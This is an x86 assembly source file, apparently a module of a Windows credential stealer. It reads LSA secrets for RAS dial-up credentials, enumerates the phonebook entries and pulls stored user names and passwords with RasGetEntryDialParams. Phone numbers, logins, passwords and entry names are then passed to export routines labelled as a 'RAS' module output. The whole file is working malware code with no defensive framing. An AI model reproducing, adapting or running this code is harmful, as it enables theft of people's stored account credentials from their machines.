; RAS: 9x, 2k, xp
; Tested on:
;	XP.pro, SP1

.const
	CP_UTF8				equ	65001
	POLICY_GET_PRIVATE_INFORMATION	equ	4

LSA_UNICODE_STRING struct DWORD
	dwLen           		WORD	?
	dwMaximumLength 		WORD	?
	lpBuffer        		DWORD	?
LSA_UNICODE_STRING ends

.data?
	dwLsaOpenPolicy			dd	?
	dwLsaPetrievePrivateData	dd	?
	dwLsaFreeMemory			dd	?	
	dwLsaClose			dd	?
	dwConvertSidToStringSid		dd	?
	dwLookupAccountName		dd	?
	dwIsValidSid			dd	?
	
.data
	IsRASInitialized		db	FALSE
	szRASLSAFuncs			db  	"advapi32.dll",0
                			db  	"LsaOpenPolicy",0
                			db  	"LsaRetrievePrivateData",0
                			db  	"LsaFreeMemory",0
                			db  	"LsaClose",0
                			db	"ConvertSidToStringSidA",0
                			db	"LookupAccountNameA",0
                			db	"IsValidSid",0,0

	@AllocStr <szRASDialUID>,	<"DialParamsUID">
	@AllocStr <szRASBook>,		<"\Microsoft\Network\Con">
	@AllocStr <szRASBook2>,		<"nections\pbk\rasphone.pbk">
	@AllocStr <szRASPolicy1>,	<"L$_RasDefaultCredentials#0">
	@AllocStr <szRASPolicy2>,	<"RasDialParams!%s#0">

.code

; Convert ANSI string to UTF-8
StrToUTF8 proc uses edi Src, Dst: DWORD
	LOCAL	lpTemp: DWORD
	
	invoke	GlobalAlloc, GPTR, 2048
	mov	lpTemp, eax	
	
        invoke  GlobalAlloc, GPTR, 2048
        mov	edi, eax
        mov	edx, Dst
        mov	dword ptr[edx], eax        
        invoke  MultiByteToWideChar, CP_ACP, 0, Src, -1, lpTemp, 1000
        invoke  WideCharToMultiByte, CP_UTF8, 0, lpTemp, -1, edi, 1000, 0, 0
        
        invoke	GlobalFree, lpTemp
        ret
StrToUTF8 endp

; Returns length of Dst in bytes
StrToUNICODE proc uses ebx Src, Dst
	; Length of UNICODE string, including NULL
	invoke	lstrlen, Src
	shl	eax, 1
	inc	eax
	inc	eax
	mov	ebx, eax
	
	; Alloc memory
        invoke  GlobalAlloc, GPTR, eax
        mov	edx, Dst
        mov	dword ptr[edx], eax        
        
        ; Convert
        invoke  MultiByteToWideChar, 0, 0, Src, -1, eax, ebx
        
        ; Result: length in bytes of UNICODE string, not including the NULL
        mov	eax, ebx
       	dec	eax
       	dec	eax
	ret
StrToUNICODE endp

; Retrieve private data from LSA subsystem, returns TRUE on success
GetLSAData proc uses ebx szKeyName, lpOutData: DWORD
	LOCAL	LsaHandle: DWORD
	LOCAL	LSAStr: LSA_UNICODE_STRING
	LOCAL	LsaObjectAttribs[24]: BYTE	; LSA_OBJECT_ATTRIBUTES
	
	xor	ebx, ebx
	
	invoke	ZeroMemory, addr LsaObjectAttribs, 24
	lea	eax, LsaHandle
	push	eax
	push	POLICY_GET_PRIVATE_INFORMATION
	lea	eax, LsaObjectAttribs
	push	eax
	push	NULL
	call	dwLsaOpenPolicy
  	test	eax, eax
  	jnz	@ret

	invoke	StrToUNICODE, szKeyName, addr LSAStr.lpBuffer
	mov	LSAStr.dwLen, ax
	mov	LSAStr.dwMaximumLength, ax
	
	push	lpOutData
	lea	eax, LSAStr
	push	eax
	push	LsaHandle
	call	dwLsaPetrievePrivateData  
	test	eax, eax
	setz	bl	
	
	invoke	GlobalFree, LSAStr.lpBuffer
	push	LsaHandle
	call	dwLsaClose 
	
@ret:	
	mov	eax, ebx
	ret
GetLSAData endp

; Returns TRUE on success
GetLSASid proc lpOutSid: DWORD
  	LOCAL	UserNameSize, SidSize, DomainSize, pSid, pSnu: DWORD
	LOCAL	UserName[256], Domain[256], Sid[256]: BYTE

	; Get username of current thread (local)
	mov	UserNameSize, 255
	invoke	GetUserName, addr UserName, addr UserNameSize
	test	eax, eax
	jz	@ret

	; Get local SID
  	mov	SidSize, 255
  	mov	DomainSize, 255
  	lea	eax, pSnu
  	push	eax
  	lea	eax, DomainSize
  	push	eax
  	lea	eax, Domain
  	push	eax
  	lea	eax, SidSize
  	push	eax
  	lea	eax, Sid
  	push	eax
  	lea	eax, UserName
  	push	eax
  	push	NULL
	call	dwLookupAccountName	
	test	eax, eax
	jz	@ret

	; Check if SID is valid
	lea	eax, Sid
	push	eax
	call	dwIsValidSid 
	test	eax, eax
	jz	@ret
	
	; Convert SID to string
	lea	eax, pSid
	push	eax	
	lea	eax, Sid
	push	eax	
	call	dwConvertSidToStringSid
	test	eax, eax
	jz	@ret
	 	 
	; Copy converted SID to lpOutSid 
	invoke	lstrcpy, lpOutSid, pSid
	
	; Free converted SID
	invoke	GlobalFree, pSid 

	mov	eax, TRUE
@ret:	
	ret
GetLSASid endp

; Read DialParamsUID value from telephone book
GetProfileUID proc uses edx ecx
	invoke  GetPrivateProfileInt, edx, offset szRASDialUID, 0, ecx
	test    eax, eax	
	ret
GetProfileUID endp

GetRasEntryCount proc lpBook: DWORD
	LOCAL	RasEntry: RASENTRYNAME
	LOCAL	SizeOfRasEntryName, Count: DWORD
	
	mov	Count, 0
	mov	SizeOfRasEntryName, sizeof RASENTRYNAME
	mov	RasEntry.dwSize, sizeof RASENTRYNAME 
	invoke	RasEnumEntries, NULL, lpBook, addr RasEntry, addr SizeOfRasEntryName, addr Count
	.IF	(eax == ERROR_BUFFER_TOO_SMALL) || (!eax)
		mov	eax, Count
	.ELSE
		xor	eax, eax
	.ENDIF
	ret
GetRasEntryCount endp

GetRasOutputBook proc uses ebx esi edi lpBook, Book1, Book2: DWORD
	LOCAL	osi: OSVERSIONINFO
	LOCAL	lsaTemp1[256], lsaTemp2[256]: BYTE
	LOCAL	RasCount, RasArraySize: DWORD
	LOCAL   RasArray: DWORD
	LOCAL	lpLSABuf: DWORD
	LOCAL   RasGetPassBool: DWORD	
	LOCAL   RasParams: RASDIALPARAMS
	LOCAL	Name1, Name2: DWORD

	invoke	GetRasEntryCount, lpBook
	test	eax, eax
	jz	@ret
	
	mov	RasCount, eax	
	xor	edx, edx
	mov	ecx, sizeof RASENTRYNAME
	imul	ecx
	mov	RasArraySize, eax
	invoke	GlobalAlloc, GPTR, eax
	mov	RasArray, eax
	mov	ebx, eax
	
	mov	dword ptr[ebx][RASENTRYNAME.dwSize], sizeof RASENTRYNAME
        invoke  RasEnumEntries, 0, lpBook, ebx, addr RasArraySize, addr RasCount
        test	eax, eax
        jnz	@ret_n_free
        
	mov     osi.dwOSVersionInfoSize, sizeof OSVERSIONINFO
	invoke  GetVersionEx, addr osi	
        .IF     (osi.dwPlatformId == VER_PLATFORM_WIN32_NT) && (osi.dwMajorVersion >= 5)
		; Get LSA passwords
		.IF	!IsRASInitialized
			invoke	DoLoadLib, offset szRASLSAFuncs, offset dwLsaOpenPolicy	
			mov	IsRASInitialized, TRUE
		.ENDIF	
		
		; Shared LSA data
		invoke	GetLSAData, offset szRASPolicy1, addr lpLSABuf
		.IF	eax
			mov	eax, lpLSABuf
			movzx	edx, [eax][LSA_UNICODE_STRING.dwLen] 
			invoke	ExportData, TYPE_RAS_LSA, 0, [eax][LSA_UNICODE_STRING.lpBuffer], edx 
			; Free buffer
			push	lpLSABuf
			call	dwLsaFreeMemory
		.ENDIF
		
		; Private LSA data
		invoke	GetLSASid, addr lsaTemp1
		.IF	eax
			invoke	wsprintf, addr lsaTemp2, offset szRASPolicy2, addr lsaTemp1
			invoke	GetLSAData, addr lsaTemp2, addr lpLSABuf
			.IF	eax
				mov	eax, lpLSABuf
				movzx	edx, [eax][LSA_UNICODE_STRING.dwLen] 
				invoke	ExportData, TYPE_RAS_LSA, 0, [eax][LSA_UNICODE_STRING.lpBuffer], edx 
				; Free buffer
				push	lpLSABuf
				call	dwLsaFreeMemory
			.ENDIF			
		.ENDIF
	.ENDIF
		
@loop:
	mov     RasGetPassBool, TRUE
	mov     RasParams.dwSize, sizeof RASDIALPARAMS
	invoke  lstrcpy, addr RasParams.szEntryName, addr [ebx][RASENTRYNAME.szEntryName]	
	invoke  RasGetEntryDialParams, lpBook, addr RasParams, addr RasGetPassBool
	.IF	!eax
		; Get size & alloc RASEntryA record
		mov	RasArraySize, 0
		invoke	RasGetEntryProperties, lpBook, addr [ebx][RASENTRYNAME.szEntryName], NULL, addr RasArraySize, 0, 0
		cmp	RasArraySize, 0
		jz	@ret_n_free
		
		invoke	GlobalAlloc, GPTR, RasArraySize
		mov	esi, eax
		
		invoke	ZeroMemory, esi, RasArraySize
		assume	esi: ptr RASENTRY
		mov     [esi].dwSize, sizeof RASENTRY
		
		invoke  RasGetEntryProperties, lpBook, addr [ebx][RASENTRYNAME.szEntryName], esi, addr RasArraySize, 0, 0
		.IF	!eax
			; Read DialParamsUID from telephone books
			.IF     (osi.dwPlatformId == VER_PLATFORM_WIN32_NT) && (osi.dwMajorVersion >= 5)
				lea     eax, RasParams.szEntryName
				mov     Name1, eax
				invoke  StrToUTF8, Name1, addr Name2
				
				mov     edx, Name1
				mov     ecx, Book1
				invoke  GetProfileUID
				jnz     @write_uid
				mov     ecx, Book2
				invoke  GetProfileUID
				jnz     @write_uid
				mov     edx, Name2
				invoke  GetProfileUID
				jnz     @write_uid
				mov     ecx, Book1
				invoke  GetProfileUID
				jz      @uid_err
				
			@write_uid:
				mov	lpLSABuf, eax
				invoke	ExportData, TYPE_RAS_UID, 0, addr lpLSABuf, 4
				
			@uid_err:
				invoke	GlobalFree, Name2
			.ENDIF
			
			; Write RAS entry data
			invoke	ExportStr, TYPE_RAS_PHONE, 0, addr [esi].szLocalPhoneNumber
			invoke	ExportStr, TYPE_RAS_AREA, 0, addr [esi].szAreaCode
			invoke	ExportData, TYPE_RAS_COUNTRY, 0, addr [esi].dwCountryCode, 4
			invoke	ExportStr, TYPE_RAS_LOGIN, 0, addr RasParams.szUserName
			invoke	ExportStr, TYPE_RAS_PASS, 0, addr RasParams.szPassword
			invoke	ExportStr, TYPE_RAS_ENTRYNAME, 0, addr RasParams.szEntryName
			
			; Check for alernative phones
			.IF	[esi].dwAlternateOffset
				mov	edi, esi
				add	edi, [esi].dwAlternateOffset
			@next:
				invoke	ExportStr, TYPE_RAS_PHONE_ALT, 0, edi
				@Next @next
			.ENDIF
			
		.ENDIF
		
		assume  esi: nothing
		invoke	GlobalFree, esi
	.ENDIF
	
	add     ebx, sizeof RASENTRYNAME
	dec	RasCount
	jnz	@loop	
	
@ret_n_free:
	invoke	GlobalFree, RasArray
	
@ret:	
	ret
GetRasOutputBook endp

GetRasOutput proc
	LOCAL	Book1[MAX_PATH+1], Book2[MAX_PATH+1]: BYTE
	LOCAL	osi: OSVERSIONINFO
	; Write header	
	invoke	ExportModule, MODULE_RAS
	
	mov     osi.dwOSVersionInfoSize, sizeof OSVERSIONINFO
	invoke  GetVersionEx, addr osi
	.IF	(osi.dwPlatformId == VER_PLATFORM_WIN32_NT) && (dwSHGetFolderPath)
		; Get phone books paths
		lea	eax, Book1
		push	eax
		push	0
		push	0
		push	1ah
		push	0
		call	dwSHGetFolderPath
		
		lea	eax, Book2
		push	eax
		push	0
		push	0
		push	23h
		push	0
		call	dwSHGetFolderPath
		invoke  lstrcat, offset szRASBook, offset szRASBook2
		invoke	lstrcat, addr Book1, offset szRASBook
		invoke	lstrcat, addr Book2, offset szRASBook
		
		invoke	GetRasOutputBook, addr Book1, addr Book1, addr Book2
		invoke	GetRasOutputBook, addr Book2, addr Book1, addr Book2
	.ELSE
		invoke	GetRasOutputBook, NULL, NULL, NULL
	.ENDIF
	
	ret
GetRasOutput endp